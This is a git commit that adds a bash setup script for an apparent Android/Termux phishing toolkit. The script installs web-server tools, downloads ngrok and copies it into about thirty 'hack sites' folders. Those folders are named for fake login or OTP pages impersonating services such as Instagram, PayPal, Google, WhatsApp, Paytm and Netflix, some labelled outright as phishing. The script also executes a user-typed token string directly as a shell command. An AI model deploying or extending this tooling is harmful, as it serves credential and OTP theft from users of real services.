7db3a88346f13119c4f09e10a8e38cae64621b19
krishpranav <krisna.pranav@gmail.com>
2021-02-19 19:19:00 +0530

    adding andorid-setup.sh

---
+++ Android-Setup.sh
@@ -0,0 +1,80 @@
+#!/bin/bash
+echo ""
+clear
+echo ""
+echo ""
+echo ""
+echo ""
+echo -e $'\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m]\e[0m\e[1;96m!!! DUDE PLEASE ENTER NGROK !!! \e[0m'
+sleep 2
+clear
+echo ""
+echo ""
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         DOWNLOAD REQUIREMENTS         !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
+echo ""
+termux-setup-storage
+apt update
+sudo apt-get install apache2
+apt install 
+apt install ruby -y
+apt install php -y
+apt install jq -y
+apt install tail -y
+apt install curl -y
+apt install zip -y
+pkg install wget -y
+pkg install ruby -y
+pkg install gem -y
+gem install lolcat
+clear
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip --no-check-certificate
+unzip ngrok-stable-linux-arm.zip
+cp -R ngrok hack sites/github/
+cp -R ngrok hack sites/Hotstar-otp-bypass/
+cp -R ngrok hack sites/instagram/
+cp -R ngrok hack sites/Linkedin/
+cp -R ngrok hack sites/Netflix/
+cp -R ngrok hack sites/Paytm-Phishing/paytm/
+cp -R ngrok hack sites/Paytm-Phishing/signup/
+cp -R ngrok hack sites/spotify/
+cp -R ngrok hack sites/whatsapp-phishing/
+cp -R ngrok hack sites/facebook/
+cp -R ngrok hack sites/google-otp/
+cp -R ngrok hack sites/instafollow/
+cp -R ngrok hack sites/ipfinder/
+cp -R ngrok hack sites/ola-otpbypass/
+cp -R ngrok hack sites/UberEats-Phishing/
+cp -R ngrok hack sites/Zomato-Phishing/
+cp -R ngrok hack sites/amazonsign/
+cp -R ngrok hack sites/tiktok/
+cp -R ngrok hack sites/phonepay/
+cp -R ngrok hack sites/paypal/
+cp -R ngrok hack sites/telegram/
+cp -R ngrok hack sites/twitter/
+cp -R ngrok hack sites/flipcart/
+cp -R ngrok hack sites/wordpress/
+cp -R ngrok hack sites/snapchat/
+cp -R ngrok hack sites/protonmail/
+cp -R ngrok hack sites/stackoverflow/
+cp -R ngrok hack sites/ebay/
+cp -R ngrok hack sites/twitch/
+cp -R ngrok hack sites/ajio/
+cp -R ngrok hack sites/cryptocurrency/
+cp -R ngrok hack sites/mobikwik/
+cp -R ngrok hack sites/pinterest/
+chmod 7777 AdvPhishing.sh
+clear
+echo ""
+echo -e $'\e[1;91m[\e[0m\e[1;33m *** \e[0m\e[1;96m]\e[0m\e[1;91m KEEP IN MIND YOU HAVE TO ENTER  \e[1;33m[ *** ]\e[0m'
+echo ""
+read -p $'\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m]\e[0m\e[1;96m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
+$token
+sleep2
+clear
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m !!    Installation Successfull   !!  \e[1;91m\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
+sleep 4
+clear
